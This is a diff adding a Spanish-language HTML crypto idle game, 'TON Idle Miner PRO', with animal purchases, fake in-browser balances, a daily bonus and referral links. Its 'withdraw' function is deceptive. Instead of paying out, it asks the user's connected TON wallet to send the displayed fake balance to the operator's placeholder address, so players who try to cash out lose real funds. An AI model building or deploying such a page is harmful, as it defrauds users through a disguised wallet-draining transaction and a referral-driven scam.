@@ -1,0 +1,248 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Animal Farm</title>
+
+  <!-- TonConnect SDK -->
+  <script src="https://unpkg.com/@tonconnect/ui@latest/dist/tonconnect-ui.min.js"></script>
+
+  <style>
+    body {
+      margin: 0;
+      font-family: Arial, sans-serif;
+      background: linear-gradient(#87CEEB, #c2f0c2);
+      overflow-x: hidden;
+      color: white;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      min-height: 100vh;
+      position: relative;
+    }
+
+    .farm-bg {
+      position: fixed;
+      inset: 0;
+      z-index: -1;
+      background: url('farm.jpg') repeat-x bottom/contain;
+      animation: moveFarm 60s linear infinite;
+      opacity: 0.9;
+    }
+
+    @keyframes moveFarm {
+      from { background-position-x: 0; }
+      to { background-position-x: -2000px; }
+    }
+
+    h1 { margin-top: 20px; text-shadow: 0 2px 6px rgba(0,0,0,0.6); }
+    .balance { font-size: 24px; margin: 6px 0; text-shadow: 0 2px 6px rgba(0,0,0,0.6); }
+
+    .grid {
+      display: grid;
+      grid-template-columns: repeat(auto-fit, minmax(220px, 1fr));
+      gap: 16px;
+      width: 90%;
+      max-width: 900px;
+      margin-top: 20px;
+    }
+
+    .card {
+      background: rgba(0,0,0,0.55);
+      border-radius: 18px;
+      padding: 16px;
+      text-align: center;
+      backdrop-filter: blur(6px);
+      box-shadow: 0 6px 25px rgba(0,0,0,0.5);
+    }
+
+    .card img { width: 90px; height: 90px; object-fit: contain; margin-bottom: 8px; }
+
+    button {
+      margin-top: 10px;
+      padding: 10px 16px;
+      border: none;
+      border-radius: 12px;
+      font-size: 14px;
+      cursor: pointer;
+      background: linear-gradient(135deg,#ffd166,#ffb703);
+      font-weight: bold;
+    }
+
+    .panel {
+      margin-top: 20px;
+      background: rgba(0,0,0,0.6);
+      padding: 14px 24px;
+      border-radius: 14px;
+      font-size: 14px;
+      text-align: center;
+    }
+
+    .ref-box {
+      margin-top: 10px;
+      word-break: break-all;
+      font-size: 12px;
+      background: rgba(255,255,255,0.1);
+      padding: 6px;
+      border-radius: 8px;
+    }
+  </style>
+</head>
+<body>
+  <div class="farm-bg"></div>
+
+  <h1>🐾 TON Idle Miner PRO</h1>
+
+  <div id="ton-connect"></div>
+
+  <div class="balance">Balance: <span id="balance">0</span> TON</div>
+  <div class="balance">Producción/seg: <span id="perSec">0</span> TON</div>
+
+  <div class="grid" id="shop"></div>
+
+  <div class="panel">
+    <div>Total ganado: <span id="earned">0</span> TON</div>
+    <div>Referidos: <span id="refs">0</span></div>
+
+    <div class="ref-box" id="refLink"></div>
+
+    <button onclick="withdraw()">💸 Retirar TON</button>
+    <br/><br/>
+    <button onclick="claimBonus()">🎁 Bonus diario</button>
+  </div>
+
+  <script>
+    const tonConnectUI = new TON_CONNECT_UI.TonConnectUI({
+      manifestUrl: 'https://your-domain.com/tonconnect-manifest.json',
+      buttonRootId: 'ton-connect'
+    });
+
+    const animals = [
+      { name: "Gallo", price: 3, production: 0.1, img: "https://images.emojiterra.com/google/noto-emoji/unicode-16.0/color/svg/1f413.svg" },
+      { name: "Oveja", price: 10, production: 0.4, img: "https://cdn-icons-png.flaticon.com/512/1998/1998610.png" },
+      { name: "Perro", price: 20, production: 1, img: "https://cdn-icons-png.flaticon.com/512/616/616430.png" },
+      { name: "Gato", price: 30, production: 1.5, img: "https://cdn-icons-png.flaticon.com/512/616/616408.png" }
+    ];
+
+    let balance = Number(localStorage.getItem("balance")) || 5;
+    let earned = Number(localStorage.getItem("earned")) || 0;
+    let owned = JSON.parse(localStorage.getItem("owned")) || [0,0,0,0];
+    let refs = Number(localStorage.getItem("refs")) || 0;
+
+    const params = new URLSearchParams(window.location.search);
+    const ref = params.get("ref");
+
+    if(ref && !localStorage.getItem("refUsed")){
+      localStorage.setItem("refUsed", ref);
+      localStorage.setItem("bonusRef", "1");
+    }
+
+    const myRef = localStorage.getItem("myRef") || Math.random().toString(36).substring(2,10);
+    localStorage.setItem("myRef", myRef);
+
+    const refLink = window.location.origin + window.location.pathname + "?ref=" + myRef;
+
+    document.getElementById("refLink").textContent = "Tu enlace: " + refLink;
+
+    const balanceEl = document.getElementById("balance");
+    const perSecEl = document.getElementById("perSec");
+    const shopEl = document.getElementById("shop");
+    const earnedEl = document.getElementById("earned");
+    const refsEl = document.getElementById("refs");
+
+    function save(){
+      localStorage.setItem("balance", balance);
+      localStorage.setItem("earned", earned);
+      localStorage.setItem("owned", JSON.stringify(owned));
+      localStorage.setItem("refs", refs);
+    }
+
+    function calcPerSec(){
+      let perDay = animals.reduce((s,a,i)=> s + a.production * owned[i],0);
+      return perDay / 86400;
+    }
+
+    function updateUI(){
+      balanceEl.textContent = balance.toFixed(4);
+      perSecEl.textContent = calcPerSec().toFixed(6);
+      earnedEl.textContent = earned.toFixed(4);
+      refsEl.textContent = refs;
+    }
+
+    function buy(i){
+      if(balance >= animals[i].price){
+        balance -= animals[i].price;
+        owned[i]++;
+
+        const inviter = localStorage.getItem("refUsed");
+        if(inviter){
+          const bonus = animals[i].price * 0.10;
+          // En versión real esto se enviaría al servidor
+          console.log("Enviar", bonus, "TON al ref", inviter);
+        }
+
+        save();
+        updateUI();
+        location.reload();
+      }
+    }
+
+    async function withdraw(){
+      if(balance < 1){ alert("Mínimo retiro: 1 TON"); return; }
+
+      const transaction = {
+        validUntil: Math.floor(Date.now()/1000) + 300,
+        messages: [{ address: "TU_WALLET_TON_AQUI", amount: (balance * 1e9).toString() }]
+      };
+
+      try {
+        await tonConnectUI.sendTransaction(transaction);
+        balance = 0;
+        save();
+        updateUI();
+        alert("Retiro enviado 🚀");
+      } catch(e){ alert("Error en retiro"); }
+    }
+
+    function claimBonus(){
+      const last = Number(localStorage.getItem("bonus")) || 0;
+      const now = Date.now();
+      if(now - last > 86400000){
+        balance += 0.5;
+        localStorage.setItem("bonus", now);
+        save();
+        updateUI();
+        alert("Ganaste 0.5 TON 🎉");
+      } else { alert("Bonus ya reclamado hoy"); }
+    }
+
+    function renderShop(){
+      animals.forEach((a,i)=>{
+        const card = document.createElement("div");
+        card.className = "card";
+        card.innerHTML = `
+          <img src="${a.img}" />
+          <h3>${a.name}</h3>
+          <p>Precio: ${a.price} TON</p>
+          <p>Producción: ${a.production} TON/día</p>
+          <p>Tienes: ${owned[i]}</p>
+          <button onclick="buy(${i})">Comprar</button>
+        `;
+        shopEl.appendChild(card);
+      });
+    }
+
+    setInterval(()=>{
+      const gain = calcPerSec();
+      balance += gain;
+      earned += gain;
+      save();
+      updateUI();
+    },1000);
+
+    renderShop();
+    updateUI();
+  </script>
+</body>
+</html>
